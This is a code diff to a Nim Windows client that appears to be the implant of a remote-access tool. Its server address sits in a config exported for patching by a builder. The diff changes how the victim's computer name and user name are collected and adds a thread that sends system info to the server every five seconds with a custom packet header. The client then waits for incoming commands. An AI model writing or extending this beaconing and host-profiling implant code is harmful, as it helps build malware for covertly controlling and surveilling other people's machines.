@@ -93,6 +93,10 @@ proc toWCharArray[N: static[int]](s: string, arr: var array[N, Utf16Char]) =
     if len > 0:
         copyMem(addr arr[0], ws[0].unsafeAddr, len * 2)
 
+proc wideToUtf8(wstr: WideCString): string =
+    if wstr == nil: return ""
+    $wstr
+
 # Global Configuration Instance (Static Initialization for Builder Patching)
 # Exported so it is not optimized out and can be found in .data section
 var g_ServerConfig* {.exportc, used.} = CONNECT_ADDRESS(
@@ -133,16 +137,20 @@ proc getSystemInfo(): ClientInfo =
     # Computer Name
     var buf = newString(MAX_PATH_LEN)
     var size = DWORD(MAX_PATH_LEN)
-    GetComputerNameA(buf.cstring, addr size)
-    buf.setLen(size)
-    var compName = toCharArray[64](buf)
+    var wBufObj = newWideCString(newString(MAX_PATH_LEN))
+    var wBuf = cast[LPWSTR](cast[pointer](toWideCString(wBufObj)))
+    GetComputerNameW(wBuf, addr size)
+    var compNameStr = wideToUtf8(toWideCString(wBufObj))
+    var compName = toCharArray[64](compNameStr)
     info.computerName = compName
 
     # User Name
     size = DWORD(MAX_PATH_LEN)
-    GetUserNameA(buf.cstring, addr size)
-    buf.setLen(size)
-    var userName = toCharArray[64](buf)
+    wBufObj = newWideCString(newString(MAX_PATH_LEN))
+    wBuf = cast[LPWSTR](cast[pointer](toWideCString(wBufObj)))
+    GetUserNameW(wBuf, addr size)
+    var userNameStr = wideToUtf8(toWideCString(wBufObj))
+    var userName = toCharArray[64](userNameStr)
     info.userName = userName
 
     # Process ID
@@ -177,6 +185,40 @@ proc getSystemInfo(): ClientInfo =
 
 # --- Networking ---
 
+proc heartbeatThread(lpParam: LPVOID): DWORD {.stdcall.} =
+    let sock = cast[SOCKET](lpParam)
+    while true:
+        Sleep(5000)
+        # Check if socket is still valid? (Hard to know without mutex/atomic, but if main thread closes it, send will fail)
+        
+        var hbInfo = getSystemInfo()
+        var respLen = sizeof(CommandPkg) - 1 + sizeof(ClientInfo)
+        var respBuf = newSeq[byte](respLen)
+        var pResp = cast[ptr CommandPkg](addr respBuf[0])
+        pResp.cmd = 1 # CMD_HEARTBEAT
+        pResp.arg1 = sizeof(ClientInfo).uint32
+        copyMem(addr pResp.data[0], addr hbInfo, sizeof(hbInfo))
+        
+        # We need to manually construct the packet because sendPkg is not thread-safe if it uses globals (it doesn't seem to)
+        # But send() on same socket from multiple threads is generally safe on Windows (interleaved bytes is the risk)
+        # Since we send full packet in one go (mostly), it should be okay-ish.
+        # Ideally we should use a mutex.
+        
+        var header: PkgHeader
+        header.flag = toCharArray[8]("FRMD26?")
+        header.originLen = int32(respLen)
+        header.totalLen = int32(sizeof(PkgHeader) + respLen)
+        
+        # Send Header
+        if send(sock, cast[ptr char](addr header), int32(sizeof(header)), 0) <= 0:
+            break
+            
+        # Send Body
+        if send(sock, cast[ptr char](addr respBuf[0]), int32(respLen), 0) <= 0:
+            break
+            
+    return 0
+
 proc sendPkg(s: SOCKET, cmd: uint32, data: pointer, len: int) =
     var header: PkgHeader
     header.flag = toCharArray[8]("FRMD26?")
@@ -209,6 +251,14 @@ proc run_client_loop() =
                 # Send Initial Info
                 var info = getSystemInfo()
                 sendPkg(sock, 0, addr info, sizeof(info))
+
+                # Heartbeat Thread
+                var hThread: HANDLE = 0
+                var threadId: DWORD = 0
+                
+                # Using CreateThread to avoid GC issues in Nim threads if not initialized properly
+                # We pass the socket as parameter
+                hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](heartbeatThread), cast[LPVOID](sock), 0, addr threadId)
 
                 while true:
                     # Receive Header
